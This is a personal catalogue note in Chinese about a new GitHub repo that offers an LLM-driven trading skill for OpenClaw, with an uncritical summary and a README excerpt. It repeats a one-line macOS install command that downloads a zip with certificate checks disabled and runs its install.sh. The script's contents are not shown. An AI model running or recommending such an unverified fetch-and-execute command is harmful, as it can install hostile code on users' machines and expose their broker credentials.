---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 318
stars_per_day: 80
forks: 0
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
category: "其他"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
last_reviewed: 2026-03-10
tags:
  - github
  - "category/其他"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "提供基於 LLM 的技術分析和交易功能，幫助用戶在市場中發現機會。"
---

# TradingView-Claw

**318** stars · **80** stars/天 · 建立 4 天前 · Python · MIT

`個人專案` `easy-install`

> [!summary] 一句話摘要
> 提供基於 LLM 的技術分析和交易功能，幫助用戶在市場中發現機會。

## 專案簡介

TradingView-Claw 是一個基於 LLM 的交易技能，能夠瀏覽圖表、執行交易並追蹤持倉。它使用技術信號進行交易決策，並通過與經紀商的 API 集成實現完整的交易功能。與其他交易工具相比，TradingView-Claw 提供了更強大的信號發現能力，能夠過濾噪音並專注於統計意義重大的信號。用戶可以輕鬆追蹤開放的持倉和賬戶狀態，並根據市場趨勢進行交易。這個工具適合對交易有一定了解的用戶，能夠幫助他們在市場中做出更明智的決策。整體而言，TradingView-Claw 是一個功能強大且易於使用的交易工具。

**技術棧**：`Python` · `JavaScript` · `Shell`

## 重點功能

- 提供即時的市場數據和圖表分析。
- 支持根據技術信號自動執行交易。
- 能夠追蹤開放的持倉和賬戶狀態。
- 過濾噪音，專注於統計意義重大的交易信號。
- 支持多種交易策略和信號分析。

## 快速開始

1. 在 macOS 上一鍵安裝
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 手動安裝
```bash
cp -r TradingView-Claw ~/.openclaw/skills/ && cd ~/.openclaw/skills/TradingView-Claw && uv sync
```
3. 通過 ClawHub 安裝
```bash
clawhub install tvclaw && cd ~/.openclaw/skills/tvclaw && uv sync
```

## 為什麼值得關注

> [!tip] 爆紅原因
> 作者在交易和技術分析方面有豐富的經驗，TradingView-Claw 直接滿足了對於高效交易工具的需求。隨著市場對於自動化交易的需求增加，這個工具在交易者中逐漸受到重視。

## 適合誰使用

**目標受眾**：對金融市場有興趣的交易者，特別是希望利用技術分析進行交易的人。

> [!example] 使用場景
> - 交易者用它來分析市場趨勢，因為它提供了即時的技術分析信號。
> - 新手用戶用它來學習交易，因為它的使用界面簡單易懂。
> - 資深交易者用它來執行高頻交易，因為它支持快速的交易執行和信號發現。

## 優缺點分析

> [!success] 優點
> - 提供即時的技術分析，幫助用戶做出明智的交易決策。
> - 支持多種交易策略，靈活應對市場變化。
> - 界面簡單易用，適合新手和資深交易者。

> [!danger] 缺點
> - 僅供教育用途，未經審核，使用需謹慎。
> - 交易市場風險高，需自行承擔損失。
> - 需要穩定的網路連接以獲取數據。

> [!warning] 注意事項
> - 僅供教育和實驗用途，未經審核。
> - 交易市場存在風險，使用者需自行承擔損失。
> - 需要穩定的網路連接以獲取市場數據。

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 0 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 90 KB |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync

## 延伸閱讀

相關概念：[[技術分析]] · [[自動化交易]] · [[金融市場]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 同分類的其他專案
> ```dataview
> LIST
> FROM "Repos"
> WHERE category = "其他" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```

---

## 個人筆記

> [!question]+ 快速評估（第一次看時填寫）
> _填寫後更新 frontmatter 的 `my_rating` 和 `status` 欄位_
> 
> **跟我的工作相關嗎？** 是 / 否 / 間接相關
> **值得花時間試用嗎？** 是 / 以後再說 / 不需要
> **第一印象**：_一句話_

> [!success]- 深度評估（試用後填寫）
> 
> | 項目 | 分數 (1-5) | 備註 |
> | --- | :---: | --- |
> | 實用性 | /5 | |
> | 技術新穎性 | /5 | |
> | 文件品質 | /5 | |
> | 社群活躍度 | /5 | |
> | 上手難度 | /5 | 1=很難 5=很簡單 |
> 
> **成熟度**：早期 / 可用 / 穩定
> **總評**：_整體評價、跟其他工具的比較、推薦給誰..._

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

### 想法與筆記

_隨時記錄想法、發現、跟其他工具的比較..._

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
